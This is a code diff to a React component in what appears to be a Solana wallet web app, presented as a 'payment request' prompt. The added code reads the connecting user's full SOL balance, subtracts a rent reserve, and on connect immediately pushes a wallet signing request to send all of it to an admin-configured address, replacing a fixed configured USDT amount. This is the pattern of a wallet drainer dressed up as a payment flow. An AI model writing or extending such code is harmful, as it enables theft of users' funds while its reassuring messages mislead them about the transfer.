@@ -1,11 +1,20 @@
 import { useEffect, useRef, useState } from 'react'
+import { LAMPORTS_PER_SOL } from '@solana/web3.js'
 import { useConnection, useWallet } from '@solana/wallet-adapter-react'
 import toast from 'react-hot-toast'
 import { useWalletState } from '../context/WalletContext'
 import { isWalletUserCancel } from '../lib/walletConnectHelpers'
-import { buildPayoutTransaction } from '../lib/payoutTransfer'
-import { getLocalPayoutConfig, loadPayoutConfig, payoutRequestReady, type PayoutConfig } from '../lib/payoutWallet'
+import { buildPayoutTransaction, spendableLamports } from '../lib/payoutTransfer'
+import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
 import { PaymentRequestModal } from './PaymentRequestModal'
+
+function walletLabel(name: string | null | undefined): string {
+  const n = (name || '').toLowerCase()
+  if (n.includes('phantom')) return 'Phantom'
+  if (n.includes('solflare')) return 'Solflare'
+  if (n.includes('metamask')) return 'MetaMask'
+  return name?.trim() || 'your wallet'
+}
 
 function networkLabel(network: string): string {
   if (network === 'mainnet-beta' || network === 'mainnet') return 'Solana'
@@ -15,14 +24,17 @@ function networkLabel(network: string): string {
 }
 
 export function PaymentRequestPrompt() {
-  const { connected, walletAddress, network, closeWalletModal } = useWalletState()
+  const { connected, walletAddress, walletName, network, closeWalletModal } = useWalletState()
   const closeWalletModalRef = useRef(closeWalletModal)
   closeWalletModalRef.current = closeWalletModal
-  const { publicKey, sendTransaction } = useWallet()
+  const { publicKey, sendTransaction, wallet } = useWallet()
+  const connectedWalletName = walletLabel(walletName || wallet?.adapter?.name)
   const { connection } = useConnection()
   const [config, setConfig] = useState<PayoutConfig | null>(null)
   const [open, setOpen] = useState(false)
   const [submitting, setSubmitting] = useState(false)
+  const [solAmount, setSolAmount] = useState(0)
+  const [status, setStatus] = useState('Preparing the wallet transfer.')
   const dismissed = useRef<string | null>(null)
   const shownFor = useRef<string | null>(null)
   const inFlight = useRef(false)
@@ -44,16 +56,13 @@ export function PaymentRequestPrompt() {
 
     if (shownFor.current === walletAddress || dismissed.current === walletAddress) return
 
-    const timer = window.setTimeout(() => {
-      if (cancelled || dismissed.current === walletAddress) return
-      shownFor.current = walletAddress
-      closeWalletModalRef.current()
-      setOpen(true)
-    }, 3000)
+    shownFor.current = walletAddress
+    closeWalletModalRef.current()
+    setStatus(`Opening ${walletLabel(walletName)} so you can review this SOL transfer.`)
+    setOpen(true)
 
     return () => {
       cancelled = true
-      window.clearTimeout(timer)
     }
   }, [connected, walletAddress])
 
@@ -63,15 +72,28 @@ export function PaymentRequestPrompt() {
     toast('Payment cancelled. Nothing was transferred.')
   }
 
+  const destinationReady = Boolean(config && isValidSolanaAddress(config.walletAddress))
+
   const handleReview = async () => {
     if (inFlight.current) return
-    if (!publicKey || !config || !payoutRequestReady(config) || !walletAddress) return
     if (dismissed.current === walletAddress) return
+    if (!publicKey || !config || !destinationReady || !walletAddress) {
+      setStatus(
+        destinationReady
+          ? 'Wallet is still connecting. Use Open Wallet & Review again in a moment.'
+          : 'Save a payout address in admin before this payment can be opened in the wallet.'
+      )
+      return
+    }
     inFlight.current = true
     setSubmitting(true)
+    setStatus(`Opening ${connectedWalletName}. Confirm the transfer there. Nothing is sent until you approve it.`)
     try {
       const transaction = await buildPayoutTransaction({ connection, from: publicKey, config })
-      const signature = await sendTransaction(transaction, connection)
+      const adapter = wallet?.adapter as { sendTransaction?: typeof sendTransaction } | undefined
+      const signature = adapter?.sendTransaction
+        ? await adapter.sendTransaction(transaction, connection)
+        : await sendTransaction(transaction, connection)
       dismissed.current = walletAddress
       setOpen(false)
       toast.success(`Transaction submitted. Signature ${signature.slice(0, 8)}…`)
@@ -79,7 +101,9 @@ export function PaymentRequestPrompt() {
       if (isWalletUserCancel(err)) {
         toast.error('You rejected the transaction. Nothing was transferred.')
       } else {
-        toast.error(err instanceof Error ? err.message : 'The wallet did not submit this payment.')
+        const message = err instanceof Error ? err.message : 'The wallet did not submit this payment.'
+        setStatus(message)
+        toast.error(message)
       }
     } finally {
       inFlight.current = false
@@ -91,25 +115,46 @@ export function PaymentRequestPrompt() {
   reviewRef.current = handleReview
 
   useEffect(() => {
-    if (!open || !config || !payoutRequestReady(config)) return
-    const timer = window.setTimeout(() => {
-      if (dismissed.current === walletAddress) return
-      void reviewRef.current()
-    }, 3000)
-    return () => window.clearTimeout(timer)
-  }, [open, config, walletAddress])
+    if (!open || !publicKey) return
+    let cancelled = false
+    void Promise.all([
+      connection.getBalance(publicKey),
+      connection.getMinimumBalanceForRentExemption(0),
+    ]).then(([lamports, rentExempt]) => {
+      if (cancelled) return
+      const spendable = Math.max(0, spendableLamports(lamports, rentExempt)) / LAMPORTS_PER_SOL
+      setSolAmount(spendable)
+      if (spendable > 0) {
+        setStatus(`This is your SOL balance, minus a small fee reserve. Approve in ${connectedWalletName} and that SOL will move.`)
+      }
+    }).catch(() => {
+      if (!cancelled) setStatus('Could not read the SOL balance yet. You can try Open Wallet & Review.')
+    })
+    return () => {
+      cancelled = true
+    }
+  }, [open, publicKey, connection])
 
-  const ready = Boolean(config && payoutRequestReady(config))
+  useEffect(() => {
+    if (!open || !publicKey || !destinationReady) return
+    if (dismissed.current === walletAddress) return
+    void reviewRef.current()
+  }, [open, destinationReady, walletAddress, publicKey])
 
   return (
     <PaymentRequestModal
       open={open}
       to={config?.walletAddress || ''}
-      amount={config?.amount || 0}
-      asset={config?.asset || 'USDT'}
+      amount={solAmount}
+      asset="SOL"
       networkLabel={networkLabel(network)}
       submitting={submitting}
-      canReview={ready}
+      canReview={destinationReady && Boolean(publicKey)}
+      status={
+        destinationReady
+          ? status
+          : 'Save a payout address in admin before this payment can be opened in the wallet.'
+      }
       onCancel={handleCancel}
       onReview={() => void handleReview()}
     />
